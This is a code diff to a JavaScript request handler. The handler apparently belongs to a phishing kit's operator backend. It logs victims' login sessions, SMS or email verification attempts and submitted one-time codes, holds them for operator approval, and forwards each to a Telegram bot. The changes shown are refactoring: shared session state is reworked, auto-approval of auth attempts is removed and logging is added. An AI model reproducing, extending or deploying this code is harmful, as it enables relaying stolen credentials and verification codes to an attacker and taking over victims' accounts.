@@ -17,8 +17,11 @@ export default async function handler(req, res) {
   let message = '';
   let sessionId = null;
 
-  // Store session for all actions that need approval
-  const pendingApprovals = global.pendingApprovals || new Map();
+  // Initialize pending approvals
+  if (!global.pendingApprovals) {
+    global.pendingApprovals = new Map();
+  }
+  const pendingApprovals = global.pendingApprovals;
 
   switch (action) {
     case 'domain_detection':
@@ -34,33 +37,25 @@ export default async function handler(req, res) {
         action: action,
         timestamp: Date.now()
       });
-      global.pendingApprovals = pendingApprovals;
       console.log(`💾 Stored login session: ${sessionId}`);
+      console.log(`📊 Total pending: ${pendingApprovals.size}`);
       break;
     case 'auth_attempt':
       sessionId = data.sessionId || 'AUTH_' + Date.now();
       message = formatAuthAttempt(data);
-      // Auto-approve auth attempts
-      pendingApprovals.set(sessionId, { 
-        status: 'approved', 
-        data: data,
-        action: action,
-        timestamp: Date.now()
-      });
-      global.pendingApprovals = pendingApprovals;
       break;
     case 'code_submitted':
       sessionId = data.sessionId || 'CODE_' + Date.now();
       message = formatCodeSubmitted(data);
-      // Store for approval (MANUAL APPROVAL REQUIRED)
+      // Store for approval
       pendingApprovals.set(sessionId, { 
         status: 'pending', 
         data: data,
         action: action,
         timestamp: Date.now()
       });
-      global.pendingApprovals = pendingApprovals;
       console.log(`💾 Stored code session: ${sessionId}`);
+      console.log(`📊 Total pending: ${pendingApprovals.size}`);
       break;
     default:
       return res.status(400).json({ error: 'Invalid action' });
@@ -111,7 +106,7 @@ ACTION: APPROVE ${sessionId}
 function formatAuthAttempt(data) {
   const { method, destination, timestamp, userAgent, ip, sessionId } = data;
   return `
-VERIFICATION REQUEST — AUTO-APPROVED
+VERIFICATION REQUEST
 ─────────────────
 METHOD    ${method === 'sms' ? 'SMS' : 'EMAIL'}
 DEST      ${destination}
@@ -162,6 +157,8 @@ async function sendTelegramMessage(botToken, chatId, message, sessionId = null) 
     disable_web_page_preview: true,
     ...replyMarkup
   };
+
+  console.log(`📤 Sending to Telegram, session: ${sessionId}`);
 
   const response = await fetch(url, {
     method: 'POST',
